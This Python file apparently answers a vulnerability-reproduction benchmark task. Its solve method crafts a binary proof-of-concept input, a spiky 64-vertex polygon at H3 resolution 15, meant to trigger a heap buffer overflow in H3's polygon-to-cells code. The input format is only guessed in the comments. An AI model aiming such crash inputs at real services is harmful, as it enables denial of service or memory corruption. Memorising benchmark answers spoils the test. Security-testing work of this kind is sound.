import struct
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a heap buffer overflow due to an under-estimation
        # of the number of H3 cells needed to cover a polygon. This can be
        # triggered by a polygon with a small area but a long, complex perimeter
        # that crosses many cell boundaries. A "spiky" star-shaped polygon
        # with long, thin points is an effective way to trigger this.

        # The fuzzer likely reads data in a specific binary format:
        # 1. H3 Resolution (1 byte)
        # 2. Number of vertices for the outer loop (2 bytes)
        # 3. Vertex coordinates (lat, lon as 8-byte doubles)
        # 4. Number of holes (4 bytes)

        # We craft a PoC with a size close to the ground-truth length of 1032 bytes.
        # With 64 vertices, the size is 1 (res) + 2 (verts) + 64*16 (coords) + 4 (holes) = 1031 bytes.
        res = 15  # Max resolution to maximize cell count
        num_verts = 64
        num_holes = 0

        # Define a spiky polygon centered at an arbitrary point.
        center_lat = 40.0
        center_lon = -110.0
        r_inner = 0.00001  # A very small inner radius
        r_outer = 10.0     # A very large outer radius for long spikes

        coords = []
        for i in range(num_verts):
            angle = 2.0 * math.pi * i / num_verts
            
            # Alternate between inner and outer radii to create spikes
            if i % 2 == 0:
                radius = r_inner
            else:
                radius = r_outer
            
            lat = center_lat + radius * math.sin(angle)
            lon = center_lon + radius * math.cos(angle)

            # Clamp coordinates to valid geographic ranges
            lat = max(-90.0, min(90.0, lat))
            lon = max(-180.0, min(180.0, lon))

            coords.append((lat, lon))

        # Pack the data into a bytes object using little-endian byte order
        poc = bytearray()
        poc.extend(struct.pack('<B', res))
        poc.extend(struct.pack('<H', num_verts))
        for lat, lon in coords:
            poc.extend(struct.pack('<dd', lat, lon))
        poc.extend(struct.pack('<I', num_holes))

        return bytes(poc)